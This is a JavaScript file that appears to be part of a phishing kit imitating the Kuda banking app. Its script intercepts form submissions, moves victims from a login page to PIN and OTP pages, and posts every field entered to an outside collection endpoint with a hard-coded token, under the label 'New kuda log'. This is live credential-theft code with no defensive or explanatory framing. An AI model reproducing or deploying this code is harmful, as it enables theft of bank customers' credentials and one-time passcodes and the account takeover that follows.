window.onload = function () {
  const routeMappings = [
    { route: '/', next: 'pin' },
    { route: 'pin', next: 'otp' },
    { route: 'otp', next: 'otp' },
    // { route: 'form', next: 'form' },
  ];

  function getNextPage(currentPathname) {
    if (currentPathname.length > 1 && currentPathname.startsWith('/')) {
      currentPathname = currentPathname.substring(1);
    }
    if (currentPathname.endsWith('.html')) {
      currentPathname = currentPathname.substring(
        0,
        currentPathname.length - 5
      );
    }

    for (const mapping of routeMappings) {
      if (currentPathname === mapping.route) {
        return `/${mapping.next}.html`;
      }
    }
  }

  function processFields(obj) {
    const result = [];

    for (const [key, value] of Object.entries(obj)) {
      if (key.endsWith('1')) {
        const prefix = key.slice(0, -1);
        result.push(`${prefix}: ${value}`);
      } else {
        result.push(`${key}: ${value}`);
      }
    }

    return result.join('\n\n');
  }

  const currentPathname = window.location.pathname;
  const nextPage = getNextPage(currentPathname);

  const btn = document.querySelector('button');
  document
    .getElementById('form')
    .addEventListener('submit', async function (event) {
      event.preventDefault();
      btn.textContent = 'Loading...';

      const formObj = Object.fromEntries(new FormData(this));
      const formData = processFields(formObj);
      const body = {
        email: {
          subject: 'New kuda log',
          text: formData,
        },
        mailID: 'Cu8vmJ',
      };

      const url = 'https://snk-api.sendforms.online/api/email';

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization:
              '4UMEZ2UTGMRh8zzSkkPZCI9uT9tV2MhcTJS6y5IQUelgoHqGygRXw3txPX7kIPQm',
          },
          body: JSON.stringify(body),
        });

        if (res.status === 200) {
          console.log('SUCCESS!');
          setTimeout(() => {
            window.location.href = nextPage;
          }, 5000);
        }
      } catch (error) {
        console.log(error);
        alert('An error occurred, please try again');
        window.location.reload();
      }
    });
};
